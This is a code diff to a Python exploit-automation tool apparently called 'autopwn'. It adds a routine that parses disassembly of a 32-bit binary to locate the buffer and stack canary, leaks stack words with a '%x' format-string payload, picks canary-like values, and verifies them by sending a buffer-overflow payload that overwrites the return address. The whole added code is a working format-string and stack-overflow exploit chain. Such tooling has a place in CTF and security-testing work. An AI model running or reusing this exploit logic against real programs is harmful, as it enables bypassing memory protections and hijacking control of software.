@@ -53,11 +53,13 @@ Design notes
 """
 from __future__ import annotations
 
+import re
 import time
 from pathlib import Path
 from typing import List, Optional, Tuple
 
-from autopwn.context import CanaryInfo, ExploitContext
+from autopwn.context import CanaryInfo, CanaryLeakPlan, ExploitContext
+from autopwn.recon.targets import inspect_functions
 
 
 # v3.1 L1316 + L1395: hex prefix used to identify canary candidates
@@ -76,6 +78,27 @@ DEFAULT_MAX_PADDING = 300
 # v4.1.18: default wall-time budget for the expensive brute-force phase.
 # ``0`` disables the guard and restores the pre-v4.1.18 unbounded search.
 DEFAULT_MAX_SECONDS = 20.0
+DEFAULT_PLAN_WORD_COUNT = 60
+
+_HEX_WORD_RE = re.compile(rb"^[0-9a-fA-F]+$")
+_INTEL_LEA_EBP_RE = re.compile(r"lea\s+\w+,\s*\[ebp-(0x[0-9a-f]+)\]")
+_INTEL_CANARY_STORE_RE = re.compile(r"mov\s+DWORD PTR \[ebp-(0x[0-9a-f]+)\],eax")
+_PRINTF_LIKE_CALLS = frozenset(
+    {
+        "printf",
+        "fprintf",
+        "sprintf",
+        "snprintf",
+        "dprintf",
+        "vprintf",
+        "vfprintf",
+        "vsprintf",
+        "vsnprintf",
+    }
+)
+_INPUT_CALL_NAMES = ("read", "gets", "fgets", "scanf")
+_SAME_SESSION_REENTRY_PAYLOAD = b"hello"
+_SAME_SESSION_TEST_RET = 0x42424242
 
 
 def leakage_canary_value(
@@ -262,6 +285,186 @@ def canary_fuzz(
                 i = 0
 
     return None
+
+
+def discover_same_session_canary_plan(
+    ctx: ExploitContext,
+    program: Path,
+    bit: int,
+    *,
+    word_count: int = DEFAULT_PLAN_WORD_COUNT,
+) -> Optional[CanaryLeakPlan]:
+    """Discover a reusable same-session canary leak plan for local x32 flows."""
+    if bit != 32 or ctx.mode != "local" or not ctx.binary.stack_canary or ctx.padding <= 0:
+        return None
+
+    layout = _infer_same_session_layout(program, total_padding=ctx.padding)
+    if layout is None:
+        return None
+    buffer_to_canary, post_canary_padding = layout
+
+    leak_payload = b".".join([b"%x"] * word_count)
+    candidate_indexes = _discover_candidate_stack_indexes(program, leak_payload)
+    for stack_index in candidate_indexes:
+        if not _probe_same_session_canary_index(
+            program,
+            leak_payload,
+            stack_index,
+            buffer_to_canary,
+            post_canary_padding,
+        ):
+            continue
+        plan = CanaryLeakPlan(
+            method="fmtstr-sequential-x32",
+            leak_payload=leak_payload,
+            stack_index=stack_index,
+            buffer_to_canary=buffer_to_canary,
+            post_canary_padding=post_canary_padding,
+            word_count=word_count,
+            reentry_payload=_SAME_SESSION_REENTRY_PAYLOAD,
+        )
+        ctx.canary_plan = plan
+        return plan
+
+    return None
+
+
+def _discover_candidate_stack_indexes(
+    program: Path,
+    leak_payload: bytes,
+) -> tuple[int, ...]:
+    from pwn import process
+
+    try:
+        with process(str(program), level="error") as io:
+            leak_line = _same_session_leak_line(io, leak_payload)
+    except Exception:
+        return ()
+
+    words = _split_hex_words(leak_line)
+    return tuple(
+        index
+        for index, word in enumerate(words, start=1)
+        if _looks_like_canary_word(word)
+    )
+
+
+def _probe_same_session_canary_index(
+    program: Path,
+    leak_payload: bytes,
+    stack_index: int,
+    buffer_to_canary: int,
+    post_canary_padding: int,
+) -> bool:
+    from pwn import p32, process
+
+    io = process(str(program), level="error")
+    try:
+        leak_line = _same_session_leak_line(io, leak_payload)
+        words = _split_hex_words(leak_line)
+        if stack_index <= 0 or stack_index > len(words):
+            return False
+
+        candidate = int(words[stack_index - 1], 16)
+        payload = (
+            b"A" * buffer_to_canary
+            + p32(candidate)
+            + b"B" * post_canary_padding
+            + p32(_SAME_SESSION_TEST_RET)
+        )
+        io.sendline(payload)
+        io.wait()
+        return io.poll() == -11
+    except Exception:
+        return False
+    finally:
+        try:
+            io.close()
+        except Exception:
+            pass
+
+
+def _same_session_leak_line(io, leak_payload: bytes) -> bytes:
+    try:
+        io.recv(timeout=0.5)
+    except Exception:
+        pass
+    io.sendline(leak_payload)
+    leak_line = io.recvline(timeout=1) or b""
+    try:
+        io.recv(timeout=0.2)
+    except Exception:
+        pass
+    return leak_line.strip()
+
+
+def _infer_same_session_layout(
+    program: Path,
+    *,
+    total_padding: int,
+) -> Optional[tuple[int, int]]:
+    if total_padding <= 4:
+        return None
+
+    target_func = None
+    for func in inspect_functions(program):
+        if func.input_call_count >= 2 and any(call in _PRINTF_LIKE_CALLS for call in func.imported_calls):
+            target_func = func
+            break
+    if target_func is None:
+        return None
+
+    lines = target_func.body.splitlines()
+    first_input_idx = next(
+        (
+            idx
+            for idx, line in enumerate(lines)
+            if "call" in line and any(name in line for name in _INPUT_CALL_NAMES)
+        ),
+        None,
+    )
+    if first_input_idx is None:
+        return None
+
+    buffer_slot = None
+    for line in reversed(lines[: first_input_idx + 1]):
+        match = _INTEL_LEA_EBP_RE.search(line)
+        if match:
+            buffer_slot = int(match.group(1), 16)
+            break
+
+    canary_slot = None
+    for idx, line in enumerate(lines):
+        if "gs:0x14" not in line:
+            continue
+        for follow in lines[idx: idx + 4]:
+            match = _INTEL_CANARY_STORE_RE.search(follow)
+            if match:
+                canary_slot = int(match.group(1), 16)
+                break
+        if canary_slot is not None:
+            break
+
+    if buffer_slot is None or canary_slot is None or buffer_slot <= canary_slot:
+        return None
+
+    buffer_to_canary = buffer_slot - canary_slot
+    post_canary_padding = total_padding - buffer_to_canary - 4
+    if buffer_to_canary <= 0 or post_canary_padding < 0:
+        return None
+    return buffer_to_canary, post_canary_padding
+
+
+def _split_hex_words(line: bytes) -> list[bytes]:
+    return [
+        token.strip().lower()
+        for token in line.split(b".")
+        if _HEX_WORD_RE.fullmatch(token.strip())
+    ]
+
+
+def _looks_like_canary_word(word: bytes) -> bool:
+    return len(word) >= 4 and word.endswith(b"00")
 
 
 # =====================================================================
@@ -497,6 +700,7 @@ def _legacy_canary_fuzz(program: Path, bit: int):
 __all__ = [
     "leakage_canary_value",
     "canary_fuzz",
+    "discover_same_session_canary_plan",
     "_legacy_leakage_canary_value",
     "_legacy_canary_fuzz",
 ]
